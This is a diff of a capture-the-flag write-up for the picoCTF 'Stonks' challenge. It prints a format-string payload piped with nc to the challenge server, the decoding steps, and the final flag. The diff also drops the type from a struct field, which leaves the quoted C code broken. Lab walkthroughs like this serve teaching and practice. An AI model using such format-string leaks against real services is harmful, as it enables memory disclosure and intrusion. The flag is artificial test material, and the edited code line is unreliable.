@@ -17,7 +17,7 @@
 
 typedef struct Stonks {
 	int shares;
-	char symbol[MAX_SYM_LEN + 1];
+	symbol[MAX_SYM_LEN + 1];
 	struct Stonks *next;
 } Stonk;
 
@@ -162,11 +162,13 @@ int main(int argc, char *argv[])
 ```
 There is a vulnerability on line 93.
 ```
+
 **Answers**
 
-1. I just put the command which they gave ``` nc mercury.picoctf.net 20195```
+1. I just put the command which they gave ` nc mercury.picoctf.net 20195`
 
 2.
+
 ```
 (echo 1; for i in {1..50}; do echo -n "%${i}\$08x"; done; echo) |  nc mercury.picoctf.net 20195
 ```
@@ -178,17 +180,21 @@ There is a vulnerability on line 93.
 ```
 
 4. Converted hex to ascii but got this.
+
 ```
 ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ¸}
 ```
 
 5. Wrote this python code.
+
 ```
  s = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ¸}'
 >>> for x in range(0, len(s), 4):
      print(s[x+3]+s[x+2]+s[x+1]+s[x], end='')
-``` 
+```
+
 6. Then got our flag.
+
 ```
 picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
 ```
